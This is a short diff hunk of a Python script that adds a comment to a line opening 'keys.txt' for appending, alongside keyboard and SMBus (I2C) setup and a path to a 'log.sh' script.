@@ -2,7 +2,7 @@ import os
 import keyboard
 from smbus import SMBus
 
-f = open("keys.txt", 'a')
+f = open("keys.txt", 'a') #opens log file
 addr = 0x20 # bus address
 bus = SMBus(1) # indicates /dev/ic2-1
 pathtologSH=f"{os.getcwd()}/log.sh"
